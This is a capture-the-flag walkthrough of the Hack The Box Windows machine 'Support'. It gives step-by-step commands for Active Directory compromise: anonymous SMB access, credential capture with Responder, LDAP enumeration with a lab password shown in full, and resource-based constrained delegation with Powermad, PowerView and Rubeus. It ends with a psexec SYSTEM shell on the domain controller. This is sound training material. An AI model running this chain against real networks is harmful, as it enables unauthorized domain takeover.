![Capture d'écran 2025-05-01 152458](https://github.com/user-attachments/assets/3cd4f0a6-ae96-4042-b108-59a2091385f4)

**Support** is an **easy-level Windows machine** on **Hack The Box (HTB)** that offers a great introduction to **Active Directory exploitation**, focusing on machine account manipulation, delegation abuse, and Kerberos ticket attacks. In this walkthrough, we’ll go from basic enumeration all the way to full **DOMAIN ADMIN** access by taking advantage of a subtle privilege misconfiguration and some clever ticket forging. If you're new to AD attacks or looking to reinforce your fundamentals, this is a perfect place to start.

Let’s jump in and take over the domain!

--- 

### Initial enumeration

To start, we add the target's IP address to our `/etc/hosts` file and perform a full port scan using **nmap** :

```
nmap support.htb -sV -sC -p- -oN nmapres
```

![Capture d'écran 2025-05-01 154316](https://github.com/user-attachments/assets/a8f35b0d-fb56-4989-a31b-eec9cecf8c2d)

The Nmap scan revealed several open ports that are commonly found on a **Windows Active Directory (AD) Domain Controller**, indicating the machine likely plays a central role in a domain-based environment. Below are the most relevant ports for our enumeration :

**TCP 53 – DNS (Simple DNS Plus)**

This port suggests the machine is running a DNS server, which is typical in AD setups. It could be useful for **zone transfers** or **domain enumeration**.

**TCP 88 – Kerberos**

Kerberos is the default authentication protocol in Active Directory. This service can be abused in attacks like **AS-REP roasting** or **Kerberoasting**, especially if usernames can be enumerated.

> _We'll revisit this after enumerating users from LDAP or SMB._

**TCP 389 – LDAP**

LDAP (Lightweight Directory Access Protocol) is critical for querying the domain’s directory services. If **anonymous bind** is allowed, it can provide a **wealth of information** like usernames, group memberships, and machine accounts.

> _This is often the first source of user enumeration in an AD environment._

**TCP 445 – SMB**

Port 445 is used for SMB (file sharing and remote administration). It can allow :

- Null sessions
    
- Enumeration of users, shares, policies
    
- Potential for relay attacks (e.g., **NTLM relaying**)
    

> _We’ll check SMB for anonymous access and enumerate users and shares._

**TCP 5985 – WinRM (HTTP)**

This port is for **Windows Remote Management** (WinRM), which can allow remote code execution if valid credentials are obtained. This becomes important **post-compromise** once we have a user’s credentials.

> _Tool of choice here is `evil-winrm` for post-auth access._

---
### SMB Enumeration – Anonymous access

We can perform a share enumeration using `smbclient` with no credentials (`-N` flag), and we obtain a list of available shares hosted on the target :

```
smbclient -N -L 10.10.11.174
```

![Capture d'écran 2025-05-01 160233](https://github.com/user-attachments/assets/95dd25f6-3d8a-4041-8fc1-49c0166299ea)

Anonymous login was successful, which indicates that the server allows unauthenticated access to list its SMB shares — a common but risky **misconfiguration** in Active Directory environments.

> Shares like `NETLOGON` and `SYSVOL` are default in domain controllers and often contain login scripts, group policies, or other domain-related files. The custom share `support-tools` is of particular interest, as it may contain internal tools or sensitive information used by support staff.

This enumeration provides a solid foothold for further exploration, particularly of readable shares that may expose user information or credentials.

---
### Exploring the support-tools SMB Share

Using anonymous access, we connected to the `support-tools` SMB share and listed its contents:

```
smbclient //10.10.11.174/support-tools
```

We can perform a directory listing using the `ls` command, and we obtain the following files :

![Capture d'écran 2025-05-01 161751](https://github.com/user-attachments/assets/6a316b7d-8f69-4456-b13a-6294e8becff1)

This share appears to contain various portable administrative tools, which may be used by support staff. Among them, the file `UserInfo.exe.zip` stands out due to its custom name, suggesting it may be an internally developed utility.

> We can perform a download of this file using the `get` command, and we obtain a ZIP archive that likely contains a custom executable :

```
get UserInfo.exe.zip
```

This file will be analyzed next to identify its purpose and determine whether it exposes sensitive information (such as usernames, domain details, or credentials).

---

### Extracting and reviewing `UserInfo.exe.zip`

After downloading the archive from the `support-tools` share, we can perform extraction using the `unzip` command, and we obtain the following files :

```
unzip UserInfo.exe.zip -d userinfo_extracted
```

This gives us an executable (`UserInfo.exe`) along with several .NET-related DLL dependencies and a configuration file :

![Capture d'écran 2025-05-01 162742](https://github.com/user-attachments/assets/e3432348-c76d-4d5a-9b67-8b318fbdd6e4)

We first examined the `UserInfo.exe.config` file for any sensitive information such as hardcoded credentials, internal IPs, or environment settings.

> However, the configuration file did not contain any useful information. It appeared to be a default .NET config file with no custom entries.

Given this, we proceeded to analyze the main binary itself  (`UserInfo.exe`) to better understand its purpose and identify any sensitive output or functionality that could be leveraged.

---

### Enumeration of hardcoded credentials in `UserInfo.exe`

The `UserInfo.exe` file is a 32-bit .NET executable, as confirmed by the following command:

```
file UserInfo.exe
```
![Capture d'écran 2025-05-01 164723](https://github.com/user-attachments/assets/2af24961-9446-49c0-8113-27ef6d562baa)

With this information, we proceeded with dynamic analysis. The goal was to intercept any credentials transmitted by the application when interacting with the LDAP server. To achieve this, we configured a fake LDAP server using **Responder**, a tool designed for poisoning **LLMNR**, **NBT-NS**, and **MDNS** requests. This would allow us to capture credentials from requests sent by the `UserInfo.exe` application.
###### Modify `/etc/hosts` to redirect requests

To ensure that the target application communicates with our fake LDAP server, we first edited the `/etc/hosts` file to redirect the `support.htb` domain to our local IP address. This is a necessary step as it ensures that any requests made by `UserInfo.exe` to the `support.htb` domain are directed to our machine, where **Responder** is running.

For example, we added the following line to `/etc/hosts` :

```
<local_IP> support.htb
```
###### Setting up responder for poisoning

After modifying the `/etc/hosts` file, we started **Responder** with the following command :

```
sudo responder -I tun0 -P -v
```

This command initiated the poisoning process on the network interface `tun0`, enabling **LLMNR**, **NBT-NS**, and **MDNS** poisoning. Responder was also configured to capture the credentials sent in plain text, which included potential LDAP or SMB login attempts.

######  Executing the target application

Next, we executed the `UserInfo.exe` binary using **Mono** on our Kali machine, as the application is a .NET executable. We ran the following command to query the LDAP server for user details :

```
mono UserInfo.exe find -first administrator
```

This command attempts to find the first "administrator" user in the environment, typically querying an LDAP server. The query is expected to trigger communication with the poisoned LDAP server we set up earlier.

###### Credential capture

While executing `UserInfo.exe`, Responder intercepted a request containing credentials in cleartext. The captured credentials were as follows :

![Capture d'écran 2025-05-01 171256](https://github.com/user-attachments/assets/3fa88111-2a86-4125-a1af-11010315fae3)

These credentials were displayed in Responder’s output, confirming that **clear-text LDAP credentials** were sent as part of the interaction between `UserInfo.exe` and the LDAP server.

To validate the credentials, we used `CrackMapExec` against the target host :

```
crackmapexec smb support.htb -d support -u ldap -p <PASSWORD>
```

![Capture d'écran 2025-05-01 174456](https://github.com/user-attachments/assets/4de60e52-e4f7-4254-af49-a479ad6b0725)

The login was successful, confirming the captured password is valid and can be used for further enumeration or privilege escalation.

---
### LDAP search 

We started by performing an LDAP search to enumerate the users in the **support.htb** domain using the following command :

```
ldapsearch -x -H ldap://support.htb -D "support\\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "(objectClass=user)"
```

Among the results, we identified the user **support** with the following relevant information :

![Capture d'écran 2025-05-01 181343](https://github.com/user-attachments/assets/ef5067e5-e53b-4983-8163-f84e2d47e047)

The `info` attribute contained a string that appeared to be a potential password.

Using **CrackMapExec**, we tested the extracted password for the **support** user on the **support.htb** machine :

![Capture d'écran 2025-05-01 181736](https://github.com/user-attachments/assets/57e1231c-78b5-4216-91fc-7842ee6c9350)

This confirmed that the password was valid and allowed us to authenticate successfully on the SMB service.

---
### Initial foothold + user flag

Once we confirmed the **support** user credentials were correct, we can try to use **evil-winrm** in order to gain access on the target system : 

```
evil-winrm -i support.htb -u support
```
![Capture d'écran 2025-05-01 182340](https://github.com/user-attachments/assets/5e510f30-5dc4-4388-94fd-ac2fd9ab2c74)

After entering the password, we successfully connected to the target system and gained a remote PowerShell session and we can get the user flag.

---

### Bloodhound


To further enumerate the Active Directory environment, we used **BloodHound**, a tool that helps identify privilege escalation paths and relationships within a domain. We leveraged our access to the `support` user via Evil-WinRM to execute the data collector `SharpHound.exe` directly on the target machine.

After uploading the `SharpHound.exe` using `evil-winrm`, we can execute the collector with all collection methods enabled :

```
.\SharpHound.exe -c All
```

![Capture d'écran 2025-05-01 183717](https://github.com/user-attachments/assets/e2d3679e-40b1-447f-8156-605a757568e8)

This gathered comprehensive information such as group memberships, sessions, ACLs, trusts, and more. After completion, a ZIP archive containing the collected data was generated :

```
20250501093657_BloodHound.zip
```

We can now download the ZIP to our local machine :

```
download 20250501093657_BloodHound.zip
```


Looking further into the BloodHound data, we observed that the `support` user is a member of the **Shared Support Accounts** group. This group has **GenericAll** rights over the domain controller computer object `DC.support.htb`.

![Capture d'écran 2025-05-01 193743](https://github.com/user-attachments/assets/c7c377f6-ebd6-48e8-ac30-c06adac62e55)

This means that the group and by extension the `support` user  has full control over this AD computer object, allowing actions such as modifying its attributes, setting a new machine password, or even performing a Resource-Based Constrained Delegation (RBCD) attack...

---

### Windows abuse 

Before doing the **Windows Absue** we need to upload the following files into the target machine : 

![Capture d'écran 2025-05-01 200819](https://github.com/user-attachments/assets/f566b74c-8e21-41e7-bd68-e34a8bf23e95)

Once the required tools are in place, we proceed with the first step of the abuse: creating a new machine account in the domain using the permissions associated with the `GenericAll` right on the domain controller object.

We use the `New-MachineAccount` function from **Powermad** to register a new computer object :

```
New-MachineAccount -MachineAccount ControlledBypwn3d -Password $(ConvertTo-SecureString 'pwn3dthisbox!' -AsPlainText -Force)
```

![Capture d'écran 2025-05-01 203502](https://github.com/user-attachments/assets/2ccd273c-ec9a-46ae-bf1a-7df4099f6c5a)

And we can see that the command completes successfully, confirming the addition of the machine account. After adding our own machine account, we retrieved its SID using PowerView. This SID will be used to configure Resource-Based Constrained Delegation (RBCD), allowing our fake machine to impersonate users on the target system.

We did this **by using the following command** :

```powershell 
$ComputerSid = Get-DomainComputer ControlledBypwn3d  -Properties objectsid | Select -Expand objectsid
```

![Capture d'écran 2025-05-01 205048](https://github.com/user-attachments/assets/ea846fd6-5312-433f-bc0a-b8884de791ec)

Next, we crafted a **custom security descriptor** that grants our fake machine full control over the target computer object. This step is necessary to set up **Resource-Based Constrained Delegation (RBCD)** :

```powershell
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

After adding the machine account and setting the security descriptor (`$SDBytes`) to the target computer, we configure it to allow delegation using the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute. This is the critical step for enabling **resource-based constrained delegation**.

```powershell
Get-DomainComputer ControlledBypwn3d | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

This command essentially sets the newly created machine account (`ControlledBypwn3d`) with the ability to act on behalf of other identities (specifically the `administrator` in this case).

Next, we use **Rubeus** to hash the password for the newly created machine account into RC4-HMAC format, which is required for later steps where we impersonate the `administrator`.

```
./Rubeus.exe hash /password:pwn3dthisbox!
```

This command provides us the RC4-HMAC : 

![Capture d'écran 2025-05-01 213203](https://github.com/user-attachments/assets/e640da2a-45eb-424d-9cc0-209c9e3677cd)

With the hashed password in hand, we can now perform **Kerberos Service-for-User (S4U) authentication**. This allows us to impersonate the `administrator` user by using the service ticket (`/rc4`) for `ControlledBypwn3d$` and request a ticket to access the file system of the target machine.

```
./Rubeus.exe s4u /user:ControlledBypwn3d$ /rc4:BD9A2BDE19C77D0C02319C0948D1E6D1 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt
```

This command performs the **S4U impersonation** of the `administrator` and injects the Kerberos ticket (`/ptt`) into the session, which grants us **access to the target system** as `administrator`.

--- 

### Privilege escalation 

Rubeus provides us with a base64-encoded `.kirbi` ticket : 

![Capture d'écran 2025-05-01 213750](https://github.com/user-attachments/assets/22372f70-eddc-4339-8d0f-8155635df2b0)

We can then decode this ticket into its `.kirbi` form, which can be further used for authentication against services : 

```
base64 -d pwn3d.kirbi > ticket.kirbi
```

Once we have the Kerberos ticket in `.kirbi` format, we use the **`ticketConverter.py`** script to convert it into a **ccache** format that can be used by various tools such as **Impacket**.

```
python3 ./ticketConverter.py ~/ctf/htb/Support/ticket.kirbi ticket.ccache
```

![Capture d'écran 2025-05-01 214148](https://github.com/user-attachments/assets/3c1f5120-1e71-4407-948e-0e3c74664bfa)

This command ensures the ticket is in the appropriate format for use with tools that require it, such as `psexec.py`.

With the **Kerberos ccache** file ready, we now use **Impacket's psexec.py** to execute commands remotely on the target machine as `NT AUTHORITY\SYSTEM`. This step is crucial for gaining full administrative access to the machine, bypassing usual user restrictions.

```
KRB5CCNAME=ticket.ccache python3 ./psexec.py support.htb/administrator@dc.support.htb -k -no-pass
```

---
### Root flag 

Once the connection is established, we can now execute commands on the target system as **NT AUTHORITY\SYSTEM**, which grants us the highest level of privileges on the machine and we can finally get the root flag : 

![Capture d'écran 2025-05-01 214212](https://github.com/user-attachments/assets/67871250-22cd-4c62-a8fa-0d49ffb56304)

![Capture d'écran 2025-05-01 214230](https://github.com/user-attachments/assets/84bc6a58-44ab-44c5-af4e-fb57f9271592)

---

**Congratulations!**  
This machine was a great opportunity to explore how small misconfigurations in an Active Directory environment can lead to a full domain compromise. From creating our own machine account to abusing delegation permissions, we gradually escalated our privileges until we were able to impersonate the domain administrator. With the help of custom Kerberos tickets and the right tools, we eventually gained full control over the domain controller.

A very rewarding challenge that highlights the importance of careful privilege management and the power of patience and methodical enumeration.

Thanks for reading and happy hacking! 
![Capture d'écran 2025-05-01 214557](https://github.com/user-attachments/assets/9d493089-015e-4e43-bb12-239d534114b7)
